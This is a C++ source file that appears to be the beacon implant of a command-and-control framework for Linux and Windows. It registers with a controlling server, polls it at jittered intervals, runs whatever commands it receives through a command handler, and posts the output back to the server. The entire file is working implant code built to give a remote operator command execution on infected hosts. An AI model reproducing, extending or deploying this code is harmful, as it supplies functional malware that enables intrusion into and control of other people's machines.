#include <iostream>
#include <string>
#include <vector>
#include <tuple>
#include <stdexcept>
#include <curl/curl.h>
#include <json/json.h>
#include <cstdlib> 
#include <ctime>

#include "config.h"

#ifdef __unix__
#define OS "Linux"
#include "../Linux/Beacon/beacon_commands.h"
#include "../Linux/generic.h"
#include <thread>
#include <chrono>
#endif

#ifdef WIN32
#include <windows.h>
#define OS "Windows"
#include "../Windows/generic.h"
#endif


std::string constructUrl(const std::string& address, const std::string& ID) {
    return URL + "/beacon?id=" + ID;
}

int calculateSleepTime(int timer, int jitter) {
    int sign = (rand() % 2 == 0) ? 1 : -1;
    int sleepTime = timer + sign * (rand() % (jitter + 1));
    return sleepTime < 0 ? timer : sleepTime;
}

void sleepFor(int seconds) {
    #ifdef _WIN32
        Sleep(seconds * 1000);
    #else
        std::this_thread::sleep_for(std::chrono::seconds(seconds));
    #endif
}

size_t WriteCallback(void* contents, size_t size, size_t nmemb, std::string* s) {
    size_t newLength = size * nmemb;
    try {
        s->append((char*)contents, newLength);
    } catch(std::bad_alloc &e) {
        // Handle memory problem
        return 0;
    }
    return newLength;
}

std::tuple<int, std::string, std::string> getRequest(const std::string& url) {
    CURL* curl;
    CURLcode res;
    long response_code;
    std::string response_body;

    curl_global_init(CURL_GLOBAL_DEFAULT);
    curl = curl_easy_init();
    if(curl) {
        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response_body);
        res = curl_easy_perform(curl);
        if(res != CURLE_OK) {
            return (std::make_tuple(-1, "", ""));
        }
        curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &response_code);
        curl_easy_cleanup(curl);
    }
    curl_global_cleanup();
    return std::make_tuple(response_code, response_body, url);
}

int retryRequest(const std::string& url, int attempts, int sleepTime) {
    for (int count = 0; count < attempts; ++count) {
        sleepFor(sleepTime);
        auto [response_code, response_body, response_url] = getRequest(url);
        if (response_code == 200) {
            return 0;
        }
    }
    return -1;
}

std::tuple<int, std::string> postRequest(const std::string& url, const std::string& jsonData) {
    CURL* curl;
    CURLcode res;
    long response_code;
    std::string response_body;
    std::cout << "Post URL: " << url << std::endl;
    std::cout << "Post data: " << jsonData << std::endl;

    curl_global_init(CURL_GLOBAL_DEFAULT);
    curl = curl_easy_init();
    if(curl) {
        struct curl_slist *headers = NULL;
        headers = curl_slist_append(headers, "Content-Type: application/json");

        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, jsonData.c_str());
        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response_body);
        res = curl_easy_perform(curl);
        if(res != CURLE_OK) {
            throw std::runtime_error("curl_easy_perform() failed: " + std::string(curl_easy_strerror(res)));
        }
        curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &response_code);
        curl_easy_cleanup(curl);
        curl_slist_free_all(headers);
    }
    curl_global_cleanup();
    return std::make_tuple(response_code, response_body);
}


std::tuple<int, std::string, int> httpConnection(const std::string& address) {
    std::string hostname = "client";
    std::vector<std::string> ipAddresses = getIPAddresses();
    std::string connectURL = URL + "/connection?name=" + hostname + "&os=" + OS + "&address=127.0.0.1";
    std::cout << "Request URL: " << connectURL << std::endl;

    auto [response_code, response_body, response_url] = getRequest(connectURL);
    if (response_code == -1) {
        return std::make_tuple(-1, "", -1);
    }

    try {
        if (response_code == 200) {
            Json::Value data;
            Json::CharReaderBuilder readerBuilder;
            std::string errs;

            std::istringstream s(response_body);
            if (!Json::parseFromStream(readerBuilder, s, &data, &errs)) {
                throw std::runtime_error("Failed to parse JSON: " + errs);
            }
            if (data.isMember("timer") && data.isMember("uuid") && data.isMember("jitter")) {
                int timer = std::stoi(data["timer"].asString());
                std::string ID = data["uuid"].asString();
                int jitter = std::stoi(data["jitter"].asString());
                return std::make_tuple(timer, ID, jitter);
            } else {
                throw std::runtime_error("Invalid JSON response: " + response_body);
            }
        } else {
            throw std::runtime_error("Failed to connect to server: " + std::to_string(response_code) + " " + response_body);
        }
    } catch (const std::exception& e) {
        std::cerr << "Exception: " << e.what() << std::endl;
        throw;
    }
}

std::tuple<int, std::string, int> httpReconnect(const std::string& address, const std::string& user_id, int jitter, int timer) {
    std::string hostname = "client";
    std::vector<std::string> ipAddresses = getIPAddresses();

    std::string reconnectURL = URL + "/reconnect?name=" + hostname + "&os=" + OS + "&address=127.0.0.1&id=" + user_id + "&timer=" + std::to_string(timer) + "&jitter=" + std::to_string(jitter);
    std::cout << "Request URL: " << reconnectURL << std::endl;

    auto [response_code, response_body, response_url] = getRequest(reconnectURL);
    if (response_code == -1) {
        return std::make_tuple(-1, "", -1);
    }

    try {
        if (response_code == 200) {
            return std::make_tuple(response_code, response_body, 0);
        } else {
            throw std::runtime_error("Failed to reconnect to server: " + std::to_string(response_code) + " " + response_body);
        }
    } catch (const std::exception& e) {
        std::cerr << "Exception: " << e.what() << std::endl;
        throw;
    }
}

bool handleResponse(const std::string& response_body, int& timer, const std::string& ID) {
    Json::Value data;
    Json::CharReaderBuilder readerBuilder;
    std::string errs;

    std::istringstream s(response_body);
    if (!Json::parseFromStream(readerBuilder, s, &data, &errs)) {
        throw std::runtime_error("Failed to parse JSON: " + errs);
    }
    std::cout << "Response: " << response_body << std::endl;

    if (data.isMember("command")) {
        std::string command = data["command"].asString();
        if (data.isMember("command_uuid")) {
            std::string command_uuid = data["command_uuid"].asString();
            std::cout << "Command recieved: " << command << std::endl;
            std::string output = command_handler(command, command_uuid);
            Json::Value json_data;
            json_data["output"] = output;
            Json::StreamWriterBuilder writer;
            std::string json_string = Json::writeString(writer, json_data);
            postRequest(URL + "/response?id=" + ID + "&cid=" + command_uuid, json_string);
        } else {
            return false;
        }
        return true;
    }
    

    if (data.isMember("timer")) {
        int newTimer = std::stoi(data["timer"].asString());
        if (newTimer > 0) {
            timer = newTimer;
        } else {
            std::cerr << "Invalid timer value received: " << newTimer << std::endl;
        }
    }

    return false;
}



int beacon(const std::string& address, const std::string& ID, int jitter, int timer) {
    srand(time(0));
    while (true) {
        std::string beaconURL = constructUrl(address, ID);
        std::cout << "Request URL: " << beaconURL << std::endl;

        int sleepTime = calculateSleepTime(timer, jitter);

        auto [response_code, response_body, response_url] = getRequest(beaconURL);
        if (response_code == -1) {
            int result = retryRequest(beaconURL, 5, sleepTime);
            if (result == -1) {
                return -1;
            }
        } else {
            try {
                if (response_code == 200) {
                    if (handleResponse(response_body, timer, ID)) {
                        continue;
                    }
                }
            } catch (const std::exception& e) {
                std::cerr << "Exception: " << e.what() << std::endl;
            }
        }

        std::cout << "Sleeping for " << sleepTime << " seconds" << std::endl;
        sleepFor(sleepTime);
    }
    return 0;
}
